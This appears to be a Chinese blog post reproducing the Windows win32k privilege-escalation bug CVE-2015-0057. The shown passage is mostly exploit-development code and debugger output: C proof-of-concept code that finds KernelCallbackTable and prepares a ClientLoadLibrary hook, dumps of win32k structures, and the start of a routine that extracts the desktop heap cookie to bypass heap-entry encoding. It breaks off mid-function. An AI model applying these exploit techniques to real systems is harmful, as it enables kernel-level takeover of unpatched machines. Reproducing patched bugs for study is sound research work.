<html>
<head>
<meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
<meta name="viewport" content="width=device-width">
<meta name="description" content="">
<meta name="keywords" content="">
<title>复现CVE-2015-0057 - Enter the Windows Heap - rick&#39;s blog</title>
<style>
BODY {
	BACKGROUND-COLOR: #ffffff;
	MARGIN: 5px;
}
TD {
	FONT-SIZE: 12px;
}
INPUT {
	FONT-SIZE: 12px;
}
SELECT {
	FONT-SIZE: 12px;
}
TD.ttd {
	FONT-SIZE: 12px; LINE-HEIGHT: 150%;
}
P {
	FONT-SIZE: 12px; LINE-HEIGHT: 150%;
}
A:link {
	COLOR: #0000ff; TEXT-DECORATION: underline;
}
A:visited {
	COLOR: #800080; TEXT-DECORATION: underline;
}
A:active {
	COLOR: #ff0000; TEXT-DECORATION: underline;
}
A:hover {
	COLOR: #ff0000; TEXT-DECORATION: underline;
}
.l15 {
	LINE-HEIGHT: 150%;
}
.title0 {
	FONT-SIZE: 17px; FONT-FAMILY: arial; FONT-WEIGHT: bold;
	TEXT-DECORATION: none; COLOR: #000000;
}
A.title1:link, A.title1:visited, A.title1:active, A.title1:hover {
	COLOR: #000000; FONT-FAMILY: arial; FONT-SIZE: 17px;
	FONT-WEIGHT: bold; TEXT-DECORATION: none;
}
A.title2:link, A.title2:visited {
	COLOR: #000000; TEXT-DECORATION: none;
}
A.title2:active, A.title2:hover {
	COLOR: #ff0000; TEXT-DECORATION: none;
}
A.news01:link, A.news01:visited {
	COLOR: #ffffff; FONT-SIZE: 12px; TEXT-DECORATION: none;
}
A.news01:active, A.news01:hover {
	COLOR: #ffffff; FONT-SIZE: 12px; TEXT-DECORATION: underline;
}
A.news1:link, A.news1:visited {
	COLOR: #ffffff; FONT-SIZE: 12px; TEXT-DECORATION: none;
}

<p>KernelCallbackTable地址是0x77389500 这侧面证明了我们可以改KernelCallbackTable 不在内核态地址 在用户态</p>
<pre><code class="hljs plaintext">process /i fffffa80630b3b00</code></pre>

<p>把上下文切到notepad.exe里面</p>
<pre><code class="hljs plaintext">dps 77389500 L50</code></pre>

<p><img src="/./%E5%A4%8D%E7%8E%B0CVE-2015-0057-Enter-the-Windows-Heap/image-20260320235757174.png" alt="image-20260320235757174"></p>
<p>我们可以看到ClientLoadLibrary是0x77389708 然后我们的开始是0x77389500 </p>
<p>0x208 &#x2F; 8 &#x3D; 41 所以 Index 为 41</p>
<p>我们就可以先开始写POC了 我们先Hook ClientLoadLibrary</p>
<pre><code class="hljs C"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span>
<span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&quot;def.h&quot;</span></span>

ULONG_PTR OriginalClientLoadLibrary = <span class="hljs-number">0</span>;


<span class="hljs-type">void</span> <span class="hljs-title function_">HookClientLoadLibrary</span><span class="hljs-params">()</span> &#123;
    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;we success hook ClientLoadLibrary!\n&quot;</span>);
    <span class="hljs-keyword">return</span>;
&#125;



<span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span>
&#123;
    GetStockObject(WHITE_BRUSH); <span class="hljs-comment">//让KernelCallbackTable变得可用</span>
    _PEB* peb = (_PEB*)__readgsqword(<span class="hljs-number">0x60</span>);
    VOID* KernelCallbackTable = peb-&gt;KernelCallbackTable; <span class="hljs-comment">//得到KernelCallbackTable地址</span>
    VOID* ClientLoadLibrary = (BYTE*)KernelCallbackTable + (<span class="hljs-number">0x41</span> * <span class="hljs-number">8</span>); <span class="hljs-comment">// win7 x64 ClientLoadLibrary index 0x41</span>
    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;ClientLoadLibrary addr = %p\n&quot;</span>, ClientLoadLibrary);
    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;HOOKClientLoadLibrary addr = %p\n&quot;</span>, HookClientLoadLibrary);
    getchar();
    
    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;
    
&#125;
</code></pre>

<p>我们运行看看 是否得到了OriginalClientLoadLibrary的地址</p>
<p><img src="/./%E5%A4%8D%E7%8E%B0CVE-2015-0057-Enter-the-Windows-Heap/image-20260401194342177.png" alt="image-20260401194342177"></p>
<p><img src="/./%E5%A4%8D%E7%8E%B0CVE-2015-0057-Enter-the-Windows-Heap/image-20260401194350138.png" alt="image-20260401194350138"></p>
<p><img src="/./%E5%A4%8D%E7%8E%B0CVE-2015-0057-Enter-the-Windows-Heap/image-20260403144448976.png" alt="image-20260403144448976"></p>
<p><img src="/./%E5%A4%8D%E7%8E%B0CVE-2015-0057-Enter-the-Windows-Heap/image-20260403144509578.png" alt="image-20260403144509578"></p>
<p><img src="/./%E5%A4%8D%E7%8E%B0CVE-2015-0057-Enter-the-Windows-Heap/image-20260403144533465.png" alt="image-20260403144533465"></p>
<pre><code class="hljs plaintext">1: kd&gt; dt win32k!tagWnd
   +0x000 head             : _THRDESKHEAD
   +0x028 state            : Uint4B
   +0x028 bHasMeun         : Pos 0, 1 Bit
   +0x028 bHasVerticalScrollbar : Pos 1, 1 Bit
   +0x028 bHasHorizontalScrollbar : Pos 2, 1 Bit
   +0x028 bHasCaption      : Pos 3, 1 Bit
   +0x028 bSendSizeMoveMsgs : Pos 4, 1 Bit
   +0x028 bMsgBox          : Pos 5, 1 Bit
   +0x028 bActiveFrame     : Pos 6, 1 Bit
   +0x028 bHasSPB          : Pos 7, 1 Bit
   +0x028 bNoNCPaint       : Pos 8, 1 Bit
   +0x028 bSendEraseBackground : Pos 9, 1 Bit
   +0x028 bEraseBackground : Pos 10, 1 Bit
   +0x028 bSendNCPaint     : Pos 11, 1 Bit
   +0x028 bInternalPaint   : Pos 12, 1 Bit
   +0x028 bUpdateDirty     : Pos 13, 1 Bit
   +0x028 bHiddenPopup     : Pos 14, 1 Bit
   +0x028 bForceMenuDraw   : Pos 15, 1 Bit
   +0x028 bDialogWindow    : Pos 16, 1 Bit
   +0x028 bHasCreatestructName : Pos 17, 1 Bit
   +0x028 bServerSideWindowProc : Pos 18, 1 Bit
   +0x028 bAnsiWindowProc  : Pos 19, 1 Bit
   +0x028 bBeingActivated  : Pos 20, 1 Bit
   +0x028 bHasPalette      : Pos 21, 1 Bit
   +0x028 bPaintNotProcessed : Pos 22, 1 Bit
   +0x028 bSyncPaintPending : Pos 23, 1 Bit
   +0x028 bRecievedQuerySuspendMsg : Pos 24, 1 Bit
   +0x028 bRecievedSuspendMsg : Pos 25, 1 Bit
   +0x028 bToggleTopmost   : Pos 26, 1 Bit
   +0x028 bRedrawIfHung    : Pos 27, 1 Bit
   +0x028 bRedrawFrameIfHung : Pos 28, 1 Bit
   +0x028 bAnsiCreator     : Pos 29, 1 Bit
   +0x028 bMaximizesToMonitor : Pos 30, 1 Bit
   +0x028 bDestroyed       : Pos 31, 1 Bit
   +0x02c state2           : Uint4B
   +0x02c bWMPaintSent     : Pos 0, 1 Bit
   +0x02c bEndPaintInvalidate : Pos 1, 1 Bit
   +0x02c bStartPaint      : Pos 2, 1 Bit
   +0x02c bOldUI           : Pos 3, 1 Bit
   +0x02c bHasClientEdge   : Pos 4, 1 Bit
   +0x02c bBottomMost      : Pos 5, 1 Bit
   +0x02c bFullScreen      : Pos 6, 1 Bit
   +0x02c bInDestroy       : Pos 7, 1 Bit
   +0x02c bWin31Compat     : Pos 8, 1 Bit
   +0x02c bWin40Compat     : Pos 9, 1 Bit
   +0x02c bWin50Compat     : Pos 10, 1 Bit
   +0x02c bMaximizeMonitorRegion : Pos 11, 1 Bit
   +0x02c bCloseButtonDown : Pos 12, 1 Bit
   +0x02c bMaximizeButtonDown : Pos 13, 1 Bit
   +0x02c bMinimizeButtonDown : Pos 14, 1 Bit
   +0x02c bHelpButtonDown  : Pos 15, 1 Bit
   +0x02c bScrollBarLineUpBtnDown : Pos 16, 1 Bit
   +0x02c bScrollBarPageUpBtnDown : Pos 17, 1 Bit
   +0x02c bScrollBarPageDownBtnDown : Pos 18, 1 Bit
   +0x02c bScrollBarLineDownBtnDown : Pos 19, 1 Bit
   +0x02c bAnyScrollButtonDown : Pos 20, 1 Bit
   +0x02c bScrollBarVerticalTracking : Pos 21, 1 Bit
   +0x02c bForceNCPaint    : Pos 22, 1 Bit
   +0x02c bForceFullNCPaintClipRgn : Pos 23, 1 Bit
   +0x02c FullScreenMode   : Pos 24, 3 Bits
   +0x02c bCaptionTextTruncated : Pos 27, 1 Bit
   +0x02c bNoMinmaxAnimatedRects : Pos 28, 1 Bit
   +0x02c bSmallIconFromWMQueryDrag : Pos 29, 1 Bit
   +0x02c bShellHookRegistered : Pos 30, 1 Bit
   +0x02c bWMCreateMsgProcessed : Pos 31, 1 Bit
   +0x030 ExStyle          : Uint4B
   +0x030 bWS_EX_DLGMODALFRAME : Pos 0, 1 Bit
   +0x030 bUnused1         : Pos 1, 1 Bit
   +0x030 bWS_EX_NOPARENTNOTIFY : Pos 2, 1 Bit
   +0x030 bWS_EX_TOPMOST   : Pos 3, 1 Bit
   +0x030 bWS_EX_ACCEPTFILE : Pos 4, 1 Bit
   +0x030 bWS_EX_TRANSPARENT : Pos 5, 1 Bit
   +0x030 bWS_EX_MDICHILD  : Pos 6, 1 Bit
   +0x030 bWS_EX_TOOLWINDOW : Pos 7, 1 Bit
   +0x030 bWS_EX_WINDOWEDGE : Pos 8, 1 Bit
   +0x030 bWS_EX_CLIENTEDGE : Pos 9, 1 Bit
   +0x030 bWS_EX_CONTEXTHELP : Pos 10, 1 Bit
   +0x030 bMakeVisibleWhenUnghosted : Pos 11, 1 Bit
   +0x030 bWS_EX_RIGHT     : Pos 12, 1 Bit
   +0x030 bWS_EX_RTLREADING : Pos 13, 1 Bit
   +0x030 bWS_EX_LEFTSCROLLBAR : Pos 14, 1 Bit
   +0x030 bUnused2         : Pos 15, 1 Bit
   +0x030 bWS_EX_CONTROLPARENT : Pos 16, 1 Bit
   +0x030 bWS_EX_STATICEDGE : Pos 17, 1 Bit
   +0x030 bWS_EX_APPWINDOW : Pos 18, 1 Bit
   +0x030 bWS_EX_LAYERED   : Pos 19, 1 Bit
   +0x030 bWS_EX_NOINHERITLAYOUT : Pos 20, 1 Bit
   +0x030 bUnused3         : Pos 21, 1 Bit
   +0x030 bWS_EX_LAYOUTRTL : Pos 22, 1 Bit
   +0x030 bWS_EX_NOPADDEDBORDER : Pos 23, 1 Bit
   +0x030 bUnused4         : Pos 24, 1 Bit
   +0x030 bWS_EX_COMPOSITED : Pos 25, 1 Bit
   +0x030 bUIStateActive   : Pos 26, 1 Bit
   +0x030 bWS_EX_NOACTIVATE : Pos 27, 1 Bit
   +0x030 bWS_EX_COMPOSITEDCompositing : Pos 28, 1 Bit
   +0x030 bRedirected      : Pos 29, 1 Bit
   +0x030 bUIStateKbdAccelHidden : Pos 30, 1 Bit
   +0x030 bUIStateFocusRectHidden : Pos 31, 1 Bit
   +0x034 style            : Uint4B
   +0x034 bReserved1       : Pos 0, 16 Bits
   +0x034 bWS_MAXIMIZEBOX  : Pos 16, 1 Bit
   +0x034 bReserved2       : Pos 0, 16 Bits
   +0x034 bWS_TABSTOP      : Pos 16, 1 Bit
   +0x034 bReserved3       : Pos 0, 16 Bits
   +0x034 bUnused5         : Pos 16, 1 Bit
   +0x034 bWS_MINIMIZEBOX  : Pos 17, 1 Bit
   +0x034 bReserved4       : Pos 0, 16 Bits
   +0x034 bUnused6         : Pos 16, 1 Bit
   +0x034 bWS_GROUP        : Pos 17, 1 Bit
   +0x034 bReserved5       : Pos 0, 16 Bits
   +0x034 bUnused7         : Pos 16, 2 Bits
   +0x034 bWS_THICKFRAME   : Pos 18, 1 Bit
   +0x034 bReserved6       : Pos 0, 16 Bits
   +0x034 bUnused8         : Pos 16, 2 Bits
   +0x034 bWS_SIZEBOX      : Pos 18, 1 Bit
   +0x034 bReserved7       : Pos 0, 16 Bits
   +0x034 bUnused9         : Pos 16, 3 Bits
   +0x034 bWS_SYSMENU      : Pos 19, 1 Bit
   +0x034 bWS_HSCROLL      : Pos 20, 1 Bit
   +0x034 bWS_VSCROLL      : Pos 21, 1 Bit
   +0x034 bWS_DLGFRAME     : Pos 22, 1 Bit
   +0x034 bWS_BORDER       : Pos 23, 1 Bit
   +0x034 bMaximized       : Pos 24, 1 Bit
   +0x034 bWS_CLIPCHILDREN : Pos 25, 1 Bit
   +0x034 bWS_CLIPSIBLINGS : Pos 26, 1 Bit
   +0x034 bDisabled        : Pos 27, 1 Bit
   +0x034 bVisible         : Pos 28, 1 Bit
   +0x034 bMinimized       : Pos 29, 1 Bit
   +0x034 bWS_CHILD        : Pos 30, 1 Bit
   +0x034 bWS_POPUP        : Pos 31, 1 Bit
   +0x038 hModule          : Ptr64 Void
   +0x040 hMod16           : Uint2B
   +0x042 fnid             : Uint2B
   +0x048 spwndNext        : Ptr64 tagWND
   +0x050 spwndPrev        : Ptr64 tagWND
   +0x058 spwndParent      : Ptr64 tagWND
   +0x060 spwndChild       : Ptr64 tagWND
   +0x068 spwndOwner       : Ptr64 tagWND
   +0x070 rcWindow         : tagRECT
   +0x080 rcClient         : tagRECT
   +0x090 lpfnWndProc      : Ptr64     int64 
   +0x098 pcls             : Ptr64 tagCLS
   +0x0a0 hrgnUpdate       : Ptr64 HRGN__
   +0x0a8 ppropList        : Ptr64 tagPROPLIST
   +0x0b0 pSBInfo          : Ptr64 tagSBINFO
   +0x0b8 spmenuSys        : Ptr64 tagMENU
   +0x0c0 spmenu           : Ptr64 tagMENU
   +0x0c8 hrgnClip         : Ptr64 HRGN__
   +0x0d0 hrgnNewFrame     : Ptr64 HRGN__
   +0x0d8 strName          : _LARGE_UNICODE_STRING
   +0x0e8 cbwndExtra       : Int4B
   +0x0f0 spwndLastActive  : Ptr64 tagWND
   +0x0f8 hImc             : Ptr64 HIMC__
   +0x100 dwUserData       : Uint8B
   +0x108 pActCtx          : Ptr64 _ACTIVATION_CONTEXT
   +0x110 pTransform       : Ptr64 _D3DMATRIX
   +0x118 spwndClipboardListenerNext : Ptr64 tagWND
   +0x120 ExStyle2         : Uint4B
   +0x120 bClipboardListener : Pos 0, 1 Bit
   +0x120 bLayeredInvalidate : Pos 1, 1 Bit
   +0x120 bRedirectedForPrint : Pos 2, 1 Bit
   +0x120 bLinked          : Pos 3, 1 Bit
   +0x120 bLayeredForDWM   : Pos 4, 1 Bit
   +0x120 bLayeredLimbo    : Pos 5, 1 Bit
   +0x120 bHIGHDPI_UNAWARE_Unused : Pos 6, 1 Bit
   +0x120 bVerticallyMaximizedLeft : Pos 7, 1 Bit
   +0x120 bVerticallyMaximizedRight : Pos 8, 1 Bit
   +0x120 bHasOverlay      : Pos 9, 1 Bit
   +0x120 bConsoleWindow   : Pos 10, 1 Bit
   +0x120 bChildNoActivate : Pos 11, 1 Bit</code></pre>

<pre><code class="hljs plaintext">1: kd&gt; dt win32k!tagPROPLIST -r
   +0x000 cEntries         : Uint4B
   +0x004 iFirstFree       : Uint4B
   +0x008 aprop            : [1] tagPROP
      +0x000 hData            : Ptr64 Void
      +0x008 atomKey          : Uint2B
      +0x00a fs               : Uint2B</code></pre>

<pre><code class="hljs plaintext">1: kd&gt; dt tagSBINFO -r
win32k!tagSBINFO
   +0x000 WSBflags         : Int4B
   +0x004 Horz             : tagSBDATA
      +0x000 posMin           : Int4B
      +0x004 posMax           : Int4B
      +0x008 page             : Int4B
      +0x00c pos              : Int4B
   +0x014 Vert             : tagSBDATA
      +0x000 posMin           : Int4B
      +0x004 posMax           : Int4B
      +0x008 page             : Int4B
      +0x00c pos              : Int4B
</code></pre>

<h3 id="Desktop-Cookie加密"><a href="#Desktop-Cookie加密" class="headerlink" title="Desktop Cookie加密"></a>Desktop Cookie加密</h3><p>在Windows8.1以后存在HEAP_ENTRY加密，需要找到key解密</p>
<p>桌面堆是专属于窗口的堆，所以我们需要创建窗口后才能找到桌面堆，否则是找不到的。</p>
<pre><code class="hljs C">BOOL <span class="hljs-title function_">GetDesktopHeapCookie</span><span class="hljs-params">()</span>
&#123;
     <span class="hljs-comment">/*</span>
<span class="hljs-comment">     * 从0x1000 开始扫每一页 如果页是READONLY 然后类型是MEM_MAPPED 然后State是MEM_COMMIT </span>
<span class="hljs-comment">     * 就可能是桌面堆 然后检查0x10 offset SegmentSignature 是否是0xffeeffee 如果是就提取0x80的xorkey</span>
<span class="hljs-comment">     */</span>
    _TEB64* _teb = (_TEB64*)NtCurrentTeb();
    ULONG_PTR deltaDHeap = *(ULONG_PTR*)((BYTE*)(_teb-&gt;Win32ClientInfo) + <span class="hljs-number">0x28</span>);
